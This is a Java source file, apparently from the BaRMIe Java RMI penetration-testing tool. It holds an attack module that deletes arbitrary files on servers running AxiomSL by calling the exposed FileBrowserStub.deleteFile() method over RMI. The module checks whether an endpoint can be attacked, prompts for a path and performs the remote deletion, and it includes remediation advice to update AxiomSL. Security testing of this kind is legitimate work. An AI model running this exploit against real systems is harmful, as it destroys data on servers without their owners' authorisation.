package nb.barmie.modes.attack.attacks.Axiom;

import axiomsl.server.rmi.FileBrowserStub;
import axiomsl.server.rmi.FileInformation;
import nb.barmie.exceptions.BaRMIeException;
import nb.barmie.exceptions.BaRMIeRemoteMethodCallException;
import nb.barmie.modes.attack.RMIAttack;
import nb.barmie.modes.enumeration.RMIEndpoint;

/***********************************************************
 * Delete arbitrary files from a server running AxiomSL.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class DeleteFile extends RMIAttack {
	/*******************
	 * Set attack properties
	 ******************/
	public DeleteFile() {
		super();
		this.setDescription("AxiomSL arbitrary file delete");
		this.setDetailedDescription("AxiomSL exposes an object FileBrowserStub, which has a deleteFile() method that deletes the file at the given path.");
		this.setRemediationAdvice("[AxiomSL] Update AxiomSL to the latest available version.");
	}
	
	/*******************
	 * Check if the given endpoint can be attacked.
	 * 
	 * @param ep An enumerated RMI endpoint.
	 * @return True if we can attack it.
	 ******************/
	public boolean canAttackEndpoint(RMIEndpoint ep) {
		return ep.hasClass("axiomsl.server.rmi.FileBrowserStub");
	}
	
	/*******************
	 * Attack the endpoint.
	 * 
	 * @param ep An enumerated RMI endpoint.
	 ******************/
	public void executeAttack(RMIEndpoint ep) throws BaRMIeException {
		FileBrowserStub fbs;
		String filename;
		
		//Ask the user for a filename to delete
		filename = this.promptUserForInput("Enter a filename to delete: ", false);
		System.out.println("");
		
		//Get the fileBrowser object from the endpoint
		System.out.println("[~] Getting fileBrowser object...");
		fbs = (FileBrowserStub)this.getRemoteObject(ep, "fileBrowser");
		
		//Attempt to delete the file
		try {
			System.out.println("[+] Retrieved, attempting to delete the file...");
			if(fbs.deleteFile(filename, false) == true) {
				System.out.println("[+] File deleted successfully");
			} else {
				System.out.println("[-] File delete failed.");
			}
		} catch(Exception re) {
			//Failed to delte the file from the target
			throw new BaRMIeRemoteMethodCallException("Failed to delete the remote file.", re);
		}
	}
}
